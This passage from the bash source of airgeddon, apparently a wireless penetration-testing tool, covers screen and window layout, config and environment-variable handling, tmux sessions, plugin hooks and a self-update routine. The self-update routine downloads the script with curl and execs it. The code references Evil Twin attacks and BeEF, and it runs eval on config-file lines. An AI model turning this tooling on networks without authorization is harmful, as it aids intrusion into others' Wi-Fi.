function print_animated_flying_saucer() {

	debug_print

	echo -e "\033[6B"

	for i in $(seq 1 8); do
		echo -e "\033[7A"
		if [ "${i}" -le 4 ]; then
			saucer_frame=${i}
		else
			saucer_frame=$((i-4))
		fi
		flying_saucer ${saucer_frame}
	done
}

#Initialize script settings
function initialize_script_settings() {

	debug_print

	distro="Unknown Linux"
	is_docker=0
	exit_code=0
	check_kill_needed=0
	nm_processes_killed=0
	airmon_fix
	autochanged_language=0
	tmpfiles_toclean=0
	routing_modified=0
	iptables_saved=0
	spoofed_mac=0
	mac_spoofing_desired=0
	dhcpd_path_changed=0
	xratio=6.2
	yratio=13.9
	ywindow_edge_lines=2
	ywindow_edge_pixels=18
	networkmanager_cmd="service network-manager restart"
	is_arm=0
	pin_dbfile_checked=0
	beef_found=0
	fake_beef_found=0
	set_script_paths
	http_proxy_set=0
	hccapx_needed=0
	xterm_ok=1
	interface_airmon_compatible=1
	secondary_interface_airmon_compatible=1
	declare -gA wps_data_array
	declare -gA interfaces_band_info
	tmux_error=0
	custom_certificates_country=""
	custom_certificates_state=""
	custom_certificates_locale=""
	custom_certificates_organization=""
	custom_certificates_email=""
	custom_certificates_cn=""
	card_vif_support=0
}

#Detect if there is a working X window system excepting for docker container and wayland
function check_xwindow_system() {

	debug_print

	if hash xset 2> /dev/null; then
		if ! xset -q > /dev/null 2>&1; then
			if [ "${XDG_SESSION_TYPE}" != "wayland" ]; then
				if [ "${is_docker}" -eq 0 ]; then
					xterm_ok=0
				fi
			fi
		fi
	fi
}

#Detect screen resolution if possible
function detect_screen_resolution() {

	debug_print

	resolution_detected=0
	if hash xdpyinfo 2> /dev/null; then
		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
			resolution_detected=1
		fi
	fi

	if [ ${resolution_detected} -eq 0 ]; then
		resolution=${standard_resolution}
	fi

	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
}

#Set windows sizes and positions
function set_windows_sizes() {

	debug_print

	set_xsizes
	set_ysizes
	set_ypositions

	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
	g2_stdright_window="${xwindow}x${ywindowone}-0+0"

	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"

	g5_left1="${xwindow}x${ywindowseventh}+0+0"
	g5_left2="${xwindow}x${ywindowseventh}+0+${second_of_seven_position}"
	g5_left3="${xwindow}x${ywindowseventh}+0+${third_of_seven_position}"
	g5_left4="${xwindow}x${ywindowseventh}+0+${fourth_of_seven_position}"
	g5_left5="${xwindow}x${ywindowseventh}+0+${fifth_of_seven_position}"
	g5_left6="${xwindow}x${ywindowseventh}+0+${sixth_of_seven_position}"
	g5_left7="${xwindow}x${ywindowseventh}+0+${seventh_of_seven_position}"
	g5_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
}

#Set sizes for x axis
function set_xsizes() {

	debug_print

	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")

	if ! xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null); then
		dec_char=","
		xtotal="${xtotal/./${dec_char}}"
		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
	else
		xtotal=${xtotaltmp}
	fi

	xcentral_space=$((xtotal * 5 / 100))
	xhalf=$((xtotal / 2))
	xwindow=$((xhalf - xcentral_space))
}

#Set sizes for y axis
function set_ysizes() {

	debug_print

	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
	if ! ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null); then
		dec_char=","
		ytotal="${ytotal/./${dec_char}}"
		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
	else
		ytotal=${ytotaltmp}
	fi

	ywindowone=$((ytotal - ywindow_edge_lines))
	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
}

#Set positions for y axis
function set_ypositions() {

	debug_print

	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))

	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
}

#Recalculate windows sizes and positions
function recalculate_windows_sizes() {

	debug_print

	detect_screen_resolution
	set_windows_sizes
}

#Initialization of env vars
#shellcheck disable=SC2145
function env_vars_initialization() {

	ordered_options_env_vars=(
									"AIRGEDDON_AUTO_UPDATE" #0
									"AIRGEDDON_SKIP_INTRO" #1
									"AIRGEDDON_BASIC_COLORS" #2
									"AIRGEDDON_EXTENDED_COLORS" #3
									"AIRGEDDON_AUTO_CHANGE_LANGUAGE" #4
									"AIRGEDDON_SILENT_CHECKS" #5
									"AIRGEDDON_PRINT_HINTS" #6
									"AIRGEDDON_5GHZ_ENABLED" #7
									"AIRGEDDON_FORCE_IPTABLES" #8
									"AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING" #9
									"AIRGEDDON_MDK_VERSION" #10
									"AIRGEDDON_PLUGINS_ENABLED" #11
									"AIRGEDDON_DEVELOPMENT_MODE" #12
									"AIRGEDDON_DEBUG_MODE" #13
									"AIRGEDDON_WINDOWS_HANDLING" #14
									)

	declare -gA nonboolean_options_env_vars
	nonboolean_options_env_vars["${ordered_options_env_vars[10]},default_value"]="mdk4" #mdk_version
	nonboolean_options_env_vars["${ordered_options_env_vars[14]},default_value"]="xterm" #windows_handling

	nonboolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Available values: mdk3, mdk4 - Define which mdk version is going to be used - Default value ${nonboolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
	nonboolean_options_env_vars["${ordered_options_env_vars[14]},rcfile_text"]="#Available values: xterm, tmux - Define the needed tool to be used for windows handling - Default value ${nonboolean_options_env_vars[${ordered_options_env_vars[14]},'default_value']}"

	declare -gA boolean_options_env_vars
	boolean_options_env_vars["${ordered_options_env_vars[0]},default_value"]="true" #auto_update
	boolean_options_env_vars["${ordered_options_env_vars[1]},default_value"]="false" #skip_intro
	boolean_options_env_vars["${ordered_options_env_vars[2]},default_value"]="true" #basic_colors
	boolean_options_env_vars["${ordered_options_env_vars[3]},default_value"]="true" #extended_colors
	boolean_options_env_vars["${ordered_options_env_vars[4]},default_value"]="true" #auto_change_language
	boolean_options_env_vars["${ordered_options_env_vars[5]},default_value"]="false" #silent_checks
	boolean_options_env_vars["${ordered_options_env_vars[6]},default_value"]="true" #print_hints
	boolean_options_env_vars["${ordered_options_env_vars[7]},default_value"]="true" #5ghz_enabled
	boolean_options_env_vars["${ordered_options_env_vars[8]},default_value"]="false" #force_iptables
	boolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="true" #force_network_manager_killing
	boolean_options_env_vars["${ordered_options_env_vars[11]},default_value"]="true" #plugins_enabled
	boolean_options_env_vars["${ordered_options_env_vars[12]},default_value"]="false" #development_mode
	boolean_options_env_vars["${ordered_options_env_vars[13]},default_value"]="false" #debug_mode

	boolean_options_env_vars["${ordered_options_env_vars[0]},rcfile_text"]="#Enabled true / Disabled false - Auto update feature (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[0]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[1]},rcfile_text"]="#Enabled true / Disabled false - Skip intro (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[1]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[2]},rcfile_text"]="#Enabled true / Disabled false - Allow colorized output - Default value ${boolean_options_env_vars[${ordered_options_env_vars[2]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[3]},rcfile_text"]="#Enabled true / Disabled false - Allow extended colorized output (ccze tool needed, it has no effect on disabled basic colors) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[3]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[4]},rcfile_text"]="#Enabled true / Disabled false - Auto change language feature - Default value ${boolean_options_env_vars[${ordered_options_env_vars[4]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[5]},rcfile_text"]="#Enabled true / Disabled false - Dependencies, root and bash version checks are done silently (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[5]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[6]},rcfile_text"]="#Enabled true / Disabled false - Print help hints on menus - Default value ${boolean_options_env_vars[${ordered_options_env_vars[6]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[7]},rcfile_text"]="#Enabled true / Disabled false - Enable 5Ghz support (it has no effect if your cards are not 5Ghz compatible cards) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[7]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Force to use iptables instead of nftables (it has no effect if nftables are not present) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Force to kill Network Manager before launching Evil Twin attacks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[11]},rcfile_text"]="#Enabled true / Disabled false - Enable plugins system - Default value ${boolean_options_env_vars[${ordered_options_env_vars[11]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[12]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[12]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[13]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[13]},'default_value']}"

	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]} ${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
	readarray -t ENV_BOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
	readarray -t ENV_NONBOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
	ARRAY_ENV_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
	ARRAY_ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_BOOLEAN_VARS_ELEMENTS[@]}")
	ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS=("${ENV_NONBOOLEAN_VARS_ELEMENTS[@]}")

	if [ -f "${osversionfile_dir}${alternative_rc_file_name}" ]; then
		rc_path="${osversionfile_dir}${alternative_rc_file_name}"
	else
		rc_path="${scriptfolder}${rc_file_name}"
		if [ ! -f "${rc_path}" ]; then
			create_rcfile
		fi
	fi

	env_vars_values_validation
}

#Validation of env vars. Missing vars, invalid values, etc. are checked
function env_vars_values_validation() {

	debug_print

	declare -gA errors_on_configuration_vars

	for item in "${ARRAY_ENV_VARS_ELEMENTS[@]}"; do
		if [ -z "${!item}" ]; then
			if grep "${item}" "${rc_path}" > /dev/null; then
				eval "export $(grep "${item}" "${rc_path}")"
			else
				if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
					eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
					errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
				elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
					eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
					errors_on_configuration_vars["${item},missing_var"]="${nonboolean_options_env_vars[${item},'default_value']}"
				fi
			fi
		fi
	done

	for item in "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
		if ! [[ "${!item,,}" =~ ^(true|false)$ ]]; then
			errors_on_configuration_vars["${item},invalid_value"]="${boolean_options_env_vars[${item},'default_value']}"
			eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
		fi
	done

	for item in "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}"; do
		if [ "${item}" = "AIRGEDDON_WINDOWS_HANDLING" ]; then
			if ! [[ "${!item,,}" =~ ^(xterm|tmux)$ ]]; then
				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
			fi
		elif [ "${item}" = "AIRGEDDON_MDK_VERSION" ]; then
			if ! [[ "${!item,,}" =~ ^(mdk3|mdk4)$ ]]; then
				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
			fi
		fi
	done

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		if hash tmux 2> /dev/null; then
			transfer_to_tmux
			if ! check_inside_tmux; then
				exit_code=1
				exit ${exit_code}
			fi
		fi
	fi
}

#Print possible issues on configuration vars
function print_configuration_vars_issues() {

	debug_print

	readarray -t ERRORS_ON_CONFIGURATION_VARS_ELEMENTS < <(printf %s\\n "${!errors_on_configuration_vars[@]}" | cut -d, -f1 | sort -u)
	ERROR_VARS_ELEMENTS=("${ERRORS_ON_CONFIGURATION_VARS_ELEMENTS[@]}")

	local stop_on_var_errors=0

	local error_var_state
	for item in "${ERROR_VARS_ELEMENTS[@]}"; do
		if [ -n "${item}" ]; then
			error_var_name="${item}"
			error_var_state=$(printf %s\\n "${!errors_on_configuration_vars[@]}" | tr " " "\n" | grep "${item}" | cut -d, -f2)
			if [ -z "${!error_var_state}" ]; then
				error_var_default_value="${errors_on_configuration_vars[${item},"${error_var_state}"]}"
				stop_on_var_errors=1
				if [ "${error_var_state}" = "missing_var" ]; then
					echo
					language_strings "${language}" 614 "yellow"
				else
					echo
					language_strings "${language}" 613 "yellow"
				fi
			fi
		fi
	done

	if [ ${stop_on_var_errors} -eq 1 ]; then
		echo
		language_strings "${language}" 115 "read"
	fi
}

#Create env vars file and fill it with default values
function create_rcfile() {

	debug_print

	local counter=0
	for item in "${ordered_options_env_vars[@]}"; do
		counter=$((counter + 1))
		if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
			{
			echo -e "${boolean_options_env_vars[${item},"rcfile_text"]}"
			echo -e "${item}=${boolean_options_env_vars[${item},"default_value"]}"
			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
				echo -ne "\n"
			fi
			} >> "${rc_path}" 2> /dev/null
		elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
			{
			echo -e "${nonboolean_options_env_vars[${item},"rcfile_text"]}"
			echo -e "${item}=${nonboolean_options_env_vars[${item},"default_value"]}"
			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
				echo -ne "\n"
			fi
			} >> "${rc_path}" 2> /dev/null
		fi
	done
}

#Detect if airgeddon is working inside a docker container
function docker_detection() {

	debug_print

	if [ -f /.dockerenv ]; then
		is_docker=1
	fi
}

#Set colorization output if set
function initialize_extended_colorized_output() {

	debug_print

	colorize=""
	if "${AIRGEDDON_BASIC_COLORS:-true}" && "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
		if hash ccze 2> /dev/null; then
			colorize="| ccze -A"
		fi
	fi
}

#Remap colors vars
function remap_colors() {

	debug_print

	if ! "${AIRGEDDON_BASIC_COLORS:-true}"; then
		green_color="${normal_color}"
		green_color_title="${normal_color}"
		red_color="${normal_color}"
		red_color_slim="${normal_color}"
		blue_color="${normal_color}"
		cyan_color="${normal_color}"
		brown_color="${normal_color}"
		yellow_color="${normal_color}"
		pink_color="${normal_color}"
		white_color="${normal_color}"
	else
		initialize_colors
	fi
}

#Initialize colors vars
function initialize_colors() {

	debug_print

	normal_color="\e[1;0m"
	green_color="\033[1;32m"
	green_color_title="\033[0;32m"
	red_color="\033[1;31m"
	red_color_slim="\033[0;031m"
	blue_color="\033[1;34m"
	cyan_color="\033[1;36m"
	brown_color="\033[0;33m"
	yellow_color="\033[1;33m"
	pink_color="\033[1;35m"
	white_color="\e[1;97m"
}

#Kill tmux session started by airgeddon
function kill_tmux_session() {

	debug_print

	if hash tmux 2> /dev/null; then
		tmux kill-session -t "${1}"
		return 0
	else
		return 1
	fi
}

#Starting point of airgeddon script inside newly created tmux session
function start_airgeddon_from_tmux() {

	debug_print

	tmux rename-window -t "${session_name}" "${tmux_main_window}"
	tmux send-keys -t "${session_name}:${tmux_main_window}" "clear;cd ${absolute_path};bash ${0}" ENTER
	sleep 0.2
	if [ "${1}" = "normal" ]; then
		tmux attach -t "${session_name}"
	else
		tmux switch-client -t "${session_name}"
	fi
}

#Create new tmux session exclusively for airgeddon
function create_tmux_session() {

	debug_print

	session_name="${1}"

	if [ "${2}" = "true" ]; then
		tmux new-session -d -s "${1}"
		start_airgeddon_from_tmux "normal"
	else
		tmux new-session -d -s "${1}"
		start_airgeddon_from_tmux "nested"
	fi
}

#Start supporting scripts inside its own tmux window
function start_tmux_processes() {

	debug_print

	local window_name
	local command_line

	window_name="${1}"
	command_line="${2}"

	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
	case "${4}" in
		"active")
			tmux new-window -t "${session_name}:" -n "${window_name}"
		;;
		*)
			tmux new-window -d -t "${session_name}:" -n "${window_name}"
		;;
	esac
	local tmux_color_cmd
	if [ -n "${3}" ]; then
		tmux_color_cmd="bg=#000000 fg=${3}"
	else
		tmux_color_cmd="bg=#000000"
	fi
	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
}

#Check if script is currently executed inside tmux session or not
function check_inside_tmux() {

	debug_print

	local parent_pid
	local parent_window
	parent_pid=$(ps -o ppid= ${PPID} 2> /dev/null | tr -d ' ')
	parent_window="$(ps --no-headers -p "${parent_pid}" -o comm= 2> /dev/null)"
	if [[ "${parent_window}" =~ tmux ]]; then
		return 0
	fi
	return 1
}

#Close any existing tmux session before opening, to avoid conflicts
#shellcheck disable=SC2009
function close_existing_airgeddon_tmux_session() {

	debug_print

	if ! check_inside_tmux; then
		eval "kill -9 $(ps --no-headers aux | grep -i 'tmux.*airgeddon' | awk '{print $2}' | tr '\n' ' ') > /dev/null 2>&1"
	fi
}

#Hand over script execution to tmux and call function to create a new session
function transfer_to_tmux() {

	debug_print

	close_existing_airgeddon_tmux_session

	if ! check_inside_tmux; then
		create_tmux_session "${session_name}" "true"
	else
		local active_session
		active_session=$(tmux display-message -p '#S')
		if [ "${active_session}" != "${session_name}" ]; then
			tmux_error=1
		fi
	fi
}

#Function to kill tmux windows using window name
function kill_tmux_windows() {

	debug_print

	local TMUX_WINDOWS_LIST=()
	local current_window_name
	readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
	for item in "${TMUX_WINDOWS_LIST[@]}"; do
		[[ "${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="${BASH_REMATCH[1]}"
		if [ "${current_window_name}" = "${tmux_main_window}" ]; then
			continue
		fi
		if [ -n "${1}" ]; then
			if [ "${current_window_name}" = "${1}" ]; then
				continue
			fi
		fi
		tmux kill-window -t "${session_name}:${current_window_name}"
	done
}

#Function to pause script execution on the main window until a process has finished executing or the user terminates it
#shellcheck disable=SC2009
function wait_for_process() {

	debug_print

	local running_process
	local running_process_pid
	local running_process_cmd_line
	running_process_cmd_line=$(echo "${1}" | tr -d '"')

	while [ -z "${running_process_pid}" ]; do
		running_process_pid=$(ps --no-headers aux | grep "${running_process_cmd_line}" | grep -v "grep ${running_process_cmd_line}" | awk '{print $2}' | tr '\n' ':')
		if [ -n "${running_process_pid}" ]; then
			running_process_pid="${running_process_pid%%:*}"
			running_process="${running_process_pid}"
		fi
	done

	while [ -n "${running_process}" ]; do
		running_process=$(ps aux | grep "${running_process_pid}" | grep -v "grep ${running_process_pid}")
		sleep 0.2
	done

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:${2}"
	fi
}

#Function to capture PID of a process started inside tmux and setting it to a global variable
#shellcheck disable=SC2009
function get_tmux_process_id() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then

		local process_cmd_line
		local process_pid

		process_cmd_line=$(echo "${1}" | tr -d '"')
		while [ -z "${process_pid}" ]; do
			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
		done
		global_process_pid="${process_pid}"
	fi
}

#Centralized function to launch window using xterm/tmux
function manage_output() {

	debug_print

	local xterm_parameters
	local tmux_command_line
	local xterm_command_line
	local window_name
	local command_tail

	xterm_parameters="${1}"
	tmux_command_line="${2}"
	xterm_command_line="\"${2}\""
	window_name="${3}"
	command_tail=" > /dev/null 2>&1 &"

	case "${AIRGEDDON_WINDOWS_HANDLING}" in
		"tmux")
			local tmux_color
			tmux_color=""
			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
			case "${4}" in
				"active")
					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
				;;
				*)
					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
				;;
			esac
		;;
		"xterm")
			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
		;;
	esac
}

#Plugins initialization, parsing and validations handling
function parse_plugins() {

	plugins_enabled=()

	shopt -s nullglob
	for path in "${plugins_paths[@]}"; do
		if [ -d "${path}" ]; then
			for file in "${path}"*.sh; do
				if [ "${file}" != "${path}plugin_template.sh" ]; then

					plugin_short_name="${file##*/}"
					plugin_short_name="${plugin_short_name%.sh*}"

					#shellcheck source=./plugins/missing_dependencies.sh
					source "${file}" "$@"
					if [ "${plugin_enabled}" -eq 1 ]; then
						validate_plugin_requirements
						plugin_validation_result=$?
						if [ "${plugin_validation_result}" -eq 0 ]; then
							plugins_enabled+=("${plugin_short_name}")
						fi
					fi
				fi
			done
		fi
	done
	shopt -u nullglob
}

#Validate if plugin meets the needed requirements
function validate_plugin_requirements() {

	if [ -n "${plugin_minimum_ag_affected_version}" ]; then
		if compare_floats_greater_than "${plugin_minimum_ag_affected_version}" "${airgeddon_version}"; then
			return 1
		fi
	fi

	if [ -n "${plugin_maximum_ag_affected_version}" ]; then
		if compare_floats_greater_than "${airgeddon_version}" "${plugin_maximum_ag_affected_version}"; then
			return 1
		fi
	fi

	if [ "${plugin_distros_supported[0]}" != "*" ]; then

		for item in "${plugin_distros_supported[@]}"; do
			if [ "${item}" = "${distro}" ]; then
				return 0
			fi
		done

		return 2
	fi

	return 0
}

#Apply modifications to functions with defined plugins changes
#shellcheck disable=SC2086,SC2001
function apply_plugin_functions_rewriting() {

	declare -A function_hooks

	local original_function
	local action

	for plugin in "${plugins_enabled[@]}"; do
		for current_function in $(compgen -A 'function' "${plugin}_" | grep -e "[override|prehook|posthook]"); do
			original_function=$(echo ${current_function} | sed "s/^${plugin}_\(override\)*\(prehook\)*\(posthook\)*_//")
			action=$(echo ${current_function} | sed "s/^${plugin}_\(override\)*\(prehook\)*\(posthook\)*_.*$/\1\2\3/")

			if ! declare -F ${original_function} &>/dev/null; then
				echo
				language_strings "${language}" 659 "red"
				exit_code=1
				exit_script_option
			fi

			if printf '%s\n' "${!function_hooks[@]}" | grep -x -q "${original_function},${action}"; then
				echo
				language_strings "${language}" 661 "red"
				exit_code=1
				exit_script_option
			fi

			if ! printf '%s\n' "${hooked_functions[@]}" | grep -x -q "${original_function}"; then
				hooked_functions+=("${original_function}")
			fi
			function_hooks[${original_function},${action}]=${plugin}
		done
	done

	local function_modifications
	local arguments
	local actions=("prehook" "override" "posthook")

	for current_function in "${hooked_functions[@]}"; do
		arguments="${current_function} "
		function_modifications=$(declare -f ${current_function} | sed "1c${current_function}_original ()")

		for action in "${actions[@]}"; do
			if printf '%s\n' "${!function_hooks[@]}" | grep -x -q "${current_function},${action}"; then
				arguments+="true "
				function_name="${function_hooks[${current_function},${action}]}_${action}_${current_function}"
				function_modifications+=$'\n'"$(declare -f ${function_name} | sed "1c${current_function}_${action} ()")"
			else
				arguments+="false "
			fi
		done

		arguments+="\"\${@}\""
		function_modifications+=$'\n'"${current_function} () {"$'\n'" plugin_function_call_handler ${arguments}"$'\n'"}"
		eval "${function_modifications}"
	done
}

#Plugins function handler in charge of managing prehook, posthooks and override function calls
function plugin_function_call_handler() {

	local function_name=${1}
	local prehook_enabled=${2}
	local override_enabled=${3}
	local posthook_enabled=${4}
	local funtion_call="${function_name}_original"

	if [ "${prehook_enabled}" = true ]; then
		local prehook_funcion_name="${function_name}_prehook"
		${prehook_funcion_name} "${@:5:${#}}"
	fi

	if [ "${override_enabled}" = true ]; then
		funtion_call="${function_name}_override"
	fi

	${funtion_call} "${@:5:${#}}"

	local result=${?}
	if [ "${posthook_enabled}" = true ]; then
		local posthook_funcion_name="${function_name}_posthook"
		${posthook_funcion_name} ${result}
		result=${?}
	fi

	return ${result}
}

#Avoid the problem of using airmon-zc without ethtool installed
function airmonzc_security_check() {

	debug_print

	if [ "${airmon}" = "airmon-zc" ]; then
		if ! hash ethtool 2> /dev/null; then
			echo
			language_strings "${language}" 247 "red"
			echo
			language_strings "${language}" 115 "read"
			exit_code=1
			exit_script_option
		fi
	fi
}

#Compare if first float argument is greater than float second argument
function compare_floats_greater_than() {

	debug_print

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>n2) exit 0; exit 1}'
}

#Compare if first float argument is greater or equal than float second argument
function compare_floats_greater_or_equal() {

	debug_print

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

#Update and relaunch the script
function download_last_version() {

	debug_print

	rewrite_script_with_custom_beef "search"

	local script_file_downloaded=0

	if download_language_strings_file; then

		get_current_permanent_language

		if timeout -s SIGTERM 15 curl -L ${urlscript_directlink} -s -o "${0}"; then
			script_file_downloaded=1
		else
			http_proxy_detect
			if [ "${http_proxy_set}" -eq 1 ]; then

				if timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} -s -o "${0}"; then
					script_file_downloaded=1
				fi
			fi
		fi
	fi

	if [ "${script_file_downloaded}" -eq 1 ]; then

		download_pins_database_file

		update_options_config_file "getdata"
		download_options_config_file
		update_options_config_file "writedata"

		echo
		language_strings "${language}" 214 "yellow"

		if [ -n "${beef_custom_path}" ]; then
			rewrite_script_with_custom_beef "set" "${beef_custom_path}"
		fi

		sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${current_permanent_language}\":" "${scriptfolder}${scriptname}" 2> /dev/null

		language_strings "${language}" 115 "read"
		chmod +x "${scriptfolder}${scriptname}" > /dev/null 2>&1
		exec "${scriptfolder}${scriptname}"
	else
		language_strings "${language}" 5 "yellow"
	fi
}

#Validate if the selected internet interface has internet access
function validate_et_internet_interface() {

	debug_print

	echo
	language_strings "${language}" 287 "blue"

	if ! check_internet_access; then
		echo
		language_strings "${language}" 288 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! check_default_route "${internet_interface}"; then
		echo
		language_strings "${language}" 290 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 289 "yellow"
	language_strings "${language}" 115 "read"
	internet_interface_selected=1
	return 0
}

#Check for access to airgeddon repository
function check_repository_access() {

	debug_print

	if hash curl 2> /dev/null; then

		if check_url_curl "https://${repository_hostname}"; then
			return 0
		fi
	fi
	return 1
}

#Check for active internet connection
function check_internet_access() {

	debug_print

	for item in "${ips_to_check_internet[@]}"; do
		if ping -c 1 "${item}" -W 1 > /dev/null 2>&1; then
			return 0
		fi
	done

	if hash curl 2> /dev/null; then
		if check_url_curl "https://${repository_hostname}"; then
			return 0
